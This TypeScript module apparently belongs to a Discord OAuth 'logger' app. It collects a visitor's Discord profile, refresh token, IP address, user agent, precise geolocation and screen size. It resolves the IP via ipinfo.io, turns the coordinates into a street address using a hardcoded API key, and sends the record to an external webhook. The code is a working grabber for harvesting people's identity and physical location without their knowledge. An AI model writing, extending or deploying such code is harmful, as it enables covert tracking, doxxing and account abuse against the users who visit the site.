import { DiscordUser } from "@/lib/types";
import { sendWebhook } from "@/lib/functions/webhook";
import { UserLocation } from "@/lib/hooks/user-location-hooks";
import { ScreenSize } from "@/lib/hooks/screen-size-hooks";

export async function logger(
  userInfo: DiscordUser,
  refreshToken: string,
  ipAddress: string,
  userAgent: string,
  location: UserLocation,
  screenSize: ScreenSize
) {
  try {
    const ipInfo = await getIpInfo(ipAddress);
    const address = await getAddress(location.latitude, location.longitude);
    console.log(userInfo, ipInfo, userAgent, location, screenSize, address);
    await sendWebhook(userInfo, ipInfo, userAgent, location, screenSize, address);
  } catch (error) {
    console.error("Error in logger:", error);
    throw error;
  }
}

export type IpInfo = {
  ip: string;
  hostname: string;
  city: string;
  region: string;
  country: string;
  loc: string;
  org: string;
  postal: string;
  timezone: string;
};

async function getIpInfo(ip: string): Promise<IpInfo> {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`, {
      method: "GET",
      headers: {
        Accept: "application/json",
      },
    });
    if (!response.ok) {
      throw new Error(`failed to get ip info: ${response.status}`);
    }
    return (await response.json()) as IpInfo;
  } catch (error) {
    console.error("Error in getIpInfo:", error);
    throw error;
  }
}

export async function getUserInfo(accessToken: string): Promise<DiscordUser> {
  try {
    const res = await fetch(`https://discord.com/api/users/@me`, {
      method: "GET",
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });
    if (!res.ok) {
      throw new Error(`failed to get user info: ${res.status}`);
    }
    return await res.json();
  } catch (error) {
    console.error("Error in getUserInfo:", error);
    throw error;
  }
}

async function getAddress(latitude: number, longitude: number): Promise<string> {
  // This API key is publicly available on the official website: www.gps-coordinates.net
  try {
    const response = await fetch(
      `https://www.gps-coordinates.net/geoproxy?q=${latitude} ${longitude}&key=9416bf2c8b1d4751be6a9a9e94ea85ca&no_annotations=1&language=ja`
    );
    if (!response.ok) {
      return "N/A";
    }
    const data = await response.json();
    return data["results"][0]["formatted"];
  } catch {
    return "N/A";
  }
}
